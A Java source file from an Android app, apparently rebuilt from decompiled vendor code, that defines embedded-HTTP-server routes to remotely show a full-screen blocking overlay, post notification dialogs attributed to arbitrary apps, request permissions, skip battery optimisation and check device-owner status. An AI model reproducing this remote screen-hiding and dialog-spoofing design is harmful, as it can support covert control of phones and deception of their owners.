package com.guard.wallet.server.handler;

import com.guard.wallet.core.AppUtils;
import com.koushikdutta.async.http.server.AsyncHttpServerResponse;
import android.util.Log;
import com.guard.wallet.req.BlockViewVO;
import com.guard.wallet.req.PermissionRequestVO;
import com.guard.wallet.server.HttpResponseHelper;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AppManagerUtils;

/**
 * UI 弹窗 Handler — 6 路由。
 * vendor server/b.java 中 /blockView ... /isDeviceOwner 路由。
 */
public final class UiDialogHandler {
    private static final String TAG = "HttpServer";

    private UiDialogHandler() {}

    // ─── /blockView ───
    // vendor: b.j(show, transparent, hint, zeroBrightness, destroyLock, response)

    public static void blockView(boolean show, boolean transparent, String hint,
                                  boolean zeroBrightness, boolean destroyLock, AsyncHttpServerResponse response) {
        try {
            boolean result = false;
            if (show) {
                BlockViewVO vo = new BlockViewVO(transparent, hint, zeroBrightness, destroyLock);
                if (com.guard.wallet.utils.DeviceUtils.isScreenOn() && MyAccessibilityService.P() != null) {
                    vo.setBlockDrawable(MyAccessibilityService.o0());
                }
                result = com.guard.wallet.helper.BlockViewManager.a(vo);
            } else {
                result = com.guard.wallet.helper.BlockViewManager.e();
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /postNotificationDialog ───
    // vendor: b.Y1(title, content, button, pkg, activity, response)

    public static void postNotificationDialog(String title, String content, String button,
                                               String pkg, String activity, AsyncHttpServerResponse response) {
        try {
            boolean result = false;
            if (com.guard.wallet.utils.SystemHelper.Z() != null
                    && !AppUtils.B(title) && !AppUtils.B(content) && !AppUtils.B(pkg)) {
                result = com.guard.wallet.helper.NotificationDialog.d(title, content, button, pkg, activity);
            }
            if (result) {
                HttpResponseHelper.ok(response, result);
            } else {
                HttpResponseHelper.noContent(response);
            }
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /showNavigateWifiDialog ───
    // vendor: b.J2(title, content, button, pkg, icon, response)

    public static void showNavigateWifiDialog(String title, String content, String button,
                                               String pkg, String icon, AsyncHttpServerResponse response) {
        try {
            boolean result = false;
            if (com.guard.wallet.utils.SystemHelper.Z() != null
                    && !AppUtils.B(title) && !AppUtils.B(content)) {
                result = com.guard.wallet.helper.NotificationDialog.c(title, content, button, pkg, icon);
            }
            if (result) {
                HttpResponseHelper.ok(response, result);
            } else {
                HttpResponseHelper.noContent(response);
            }
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /requestPermission ───
    // vendor: b.l2(PermissionRequestVO, response) — 权限请求委托

    public static void requestPermission(PermissionRequestVO vo, AsyncHttpServerResponse response) {
        try {
            if (vo == null) {
                HttpResponseHelper.error(response, "你提交的参数有误,委托ID、动作参数不能为空");
                return;
            }
            Object data = null;
            if (com.guard.wallet.permission.PermissionManager.instance != null) {
                com.guard.wallet.permission.PermissionManager.instance.getClass();
                data = com.guard.wallet.permission.PermissionManager.handlePermission(vo);
            }
            HttpResponseHelper.ok(response, data, 1);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /ignoreBatteryOptimization ───

    public static void ignoreBatteryOptimization(AsyncHttpServerResponse response) {
        try {
            android.content.Context ctx = AppManagerUtils.getContext();
            if (ctx != null) {
                android.content.Intent intent = new android.content.Intent(
                        android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(android.net.Uri.parse("package:" + ctx.getPackageName()));
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /isDeviceOwner ───

    public static void isDeviceOwner(AsyncHttpServerResponse response) {
        try {
            android.content.Context ctx = AppManagerUtils.getContext();
            boolean isOwner = false;
            if (ctx != null) {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager) ctx.getSystemService(
                                android.content.Context.DEVICE_POLICY_SERVICE);
                if (dpm != null) {
                    isOwner = dpm.isDeviceOwnerApp(ctx.getPackageName());
                }
            }
            HttpResponseHelper.ok(response, isOwner);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }
}
